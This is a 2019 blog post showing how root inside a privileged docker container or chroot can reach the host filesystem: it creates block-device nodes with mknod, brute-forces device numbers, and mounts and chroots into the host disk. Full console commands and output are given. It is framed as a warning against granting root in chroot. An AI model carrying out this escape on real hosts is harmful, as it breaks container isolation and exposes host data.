Hacking the chroot/docker
#########################

:keywords: linux, chroot, hacking, docker
:tags: linux, chroot, hacking, docker
:date: 2019-03-04
:Status: published
:slug: chroot-breaking-1
:lang: en

In this post I'm going to access supervisor's filesystem when having *root* in *chroot*.
With that, I want to show you, why you should never give root access to users in *chroot*.

Crash course
------------

.. youtube:: TQRcC2OEHn8

Because *docker* (like most of container technologies) uses *chroot*, exiting a *chroot* or *docker* will use the same technique.
Presented method need root access in docker run as *privileged* (in case you use docker).

.. code-block:: console

    # docker run -it --privileged centos /bin/bash
    # mknod /tmp/host_disk b 259 1
    # mount /tmp/host_disk /mnt/
    # chroot /mnt/ /bin/bash

Method description
------------------

.. youtube:: CVRyg4fYdq4

This method uses *chroot* to the supervisor's *filesystem*.
Usually, we don't have ``/dev/`` directory in *chroot*, so we cannot mount host *filesystem* and we have to create special device file manually.

In Linux devices are represented by special files.
Two, the most important, device types are block devices and character devices.
Character devices are devices which communicates by single char at a time and block devices are devices which communicates with blocks.

Usually, character devices let only read and write.
These devices are ex. mouse, keyboard, ``/dev/random``, pseudoterminal.
Block devices let you random access to device.
These devices are ex. hard disk, cdrom.

Every device special file is defined by three parameters:

- type: block or character device
- major: major device number
- minor: minor device number

Linux kernel using type, major and minor knows which driver should handle device operations.
Full list of defined majors and minors is defined in `linux kernel documentation`_

You can use ``mknod`` to create device special file.
But, there is a catch.
Because, we have to know major and minor numbers of device we want to create, we have to *guess* them.
We can use documentation to know, that IDE hard disk have major 3, SCSI major 8 and so on.
This well know values are good starting points while looking for device with hosts *filesystem*.
If it's not any of them, we have to loop over all possible devices.

.. code-block:: console

    # docker run --rm -it --privileged centos /bin/bash
    # mkdir /tmp/devices
    # cd /tmp/devices/
    # for i in $(seq 1 300); do mknod device_$i b $i 0; done
    # ls -l
    brw-r--r--. 1 root root   1, 0 Feb 10 16:57 device_1
    brw-r--r--. 1 root root  10, 0 Feb 10 16:57 device_10
    brw-r--r--. 1 root root 100, 0 Feb 10 16:57 device_100
    brw-r--r--. 1 root root 101, 0 Feb 10 16:57 device_101
    brw-r--r--. 1 root root 102, 0 Feb 10 16:57 device_102
    brw-r--r--. 1 root root 103, 0 Feb 10 16:57 device_103
    brw-r--r--. 1 root root 104, 0 Feb 10 16:57 device_104
    (...)
    # fdisk  -l * 2>/dev/null
    Disk device_1: 16 MB, 16777216 bytes, 32768 sectors
    Units = sectors of 1 * 512 = 512 bytes
    Sector size (logical/physical): 512 bytes / 512 bytes
    I/O size (minimum/optimal): 512 bytes / 512 bytes
    
    Disk device_253: 44.0 GB, 44023414784 bytes, 85983232 sectors
    Units = sectors of 1 * 512 = 512 bytes
    Sector size (logical/physical): 512 bytes / 512 bytes
    I/O size (minimum/optimal): 512 bytes / 512 bytes
    Disk label type: dos
    Disk identifier: 0x0009b93d
    
          Device Boot      Start         End      Blocks   Id  System
    device_253p1   *        2048    83886079    41942016   83  Linux

As we can se, there are only two existing block devices: ``device_1`` and ``device_253``.
``device_1`` is ``RAM disk``, so it's not what we are looking for.
The next one looks like host *filesystem* device.
If case we didn't find any device, we should try looking for minor different than 0.
Because minor 0 is used for whole drive, and we want to access specific partition, we have to create device for specific partition.

.. code-block:: console

    # mknod device_253_1 b 253 1

Now, when we have device for host root *filesystem*, we can mount that partition and ``chroot``.

.. code-block:: console

    # mount device_253_1 /mnt/
    # chroot /mnt/ /bin/bash

And now we have broken chroot and access host *filesystem*.


.. _linux kernel documentation: https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/devices.txt
